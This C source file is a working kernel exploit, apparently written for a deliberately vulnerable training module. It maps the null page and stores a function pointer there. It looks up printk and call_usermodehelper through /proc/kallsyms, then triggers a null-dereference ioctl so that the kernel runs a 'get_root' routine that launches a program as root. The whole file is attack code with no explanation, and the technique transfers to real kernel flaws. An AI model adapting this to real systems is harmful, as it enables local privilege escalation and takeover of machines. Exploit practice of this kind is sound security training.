#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <limits.h>
#include <string.h>

#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>

#include <sys/syscall.h>
#include <sys/capability.h>

#include "vuln_ioctl.h"

struct cred;
struct task_struct;

static void (*printk)(const char*fmt, ...);
static int (*call_usermodehelper)(char *path, char **argv, char **envp, int wait) __attribute__((regparm(4)));

#define UMH_WAIT_PROC	2

static inline int finit_module(int fd, const char *param_values, int flags)
{
	return syscall(SYS_finit_module, fd, param_values, flags);
}

void *get_ksym(char *name) {
	FILE *f = fopen("/proc/kallsyms", "rb");
	char c, sym[512];
	void *addr, *found = NULL;

	while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
		if (!strcmp(sym, name)) {
			found = addr;
			break;
		}
	}
	fclose(f);
	return found;
}

static unsigned long a_printk;

static int result;

static void get_root(void)
{
	char *argv[3];
	char *envp[3];

	char arg0[] = "/usr/bin/touch";
	char arg1[] = "/tmp/call_from_kernel";

	char env0[] = "HOME=/";
	char env1[] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";

	printk("PWNEED!!! %p %p | %p %p\n", arg0, arg1, env0, env1);

	argv[0] = arg0;
	argv[1] = arg1;
	argv[2] = NULL;

	envp[0] = env0;
	envp[1] = env1;
	envp[2] = NULL;

	result = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

int main(int argc, char **argv)
{
	int fd = open("/dev/vuln", O_RDWR);
	if (fd < 0) {
		perror("open dev failed:");
		return -1;
	}

	printk              = get_ksym("printk");
	call_usermodehelper = get_ksym("call_usermodehelper");

	void (**fn)(void) = mmap(0, 4096, PROT_READ|PROT_WRITE,
				 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
	if (fn != NULL) {
		perror("mmap: ");
		close(fd);
		return;
	}
	*fn = get_root;

	int ret = ioctl(fd, VULN_NULL_DEREFERENCE);
	close(fd);
	if (ret) {
		perror("vuln ioctl failed:");
		return ret;
	}

	if (result) {
		printf("call_usermodehelper: %d\n", result);
		return -1;
	}

	printf("success\n");

	return 0;
}
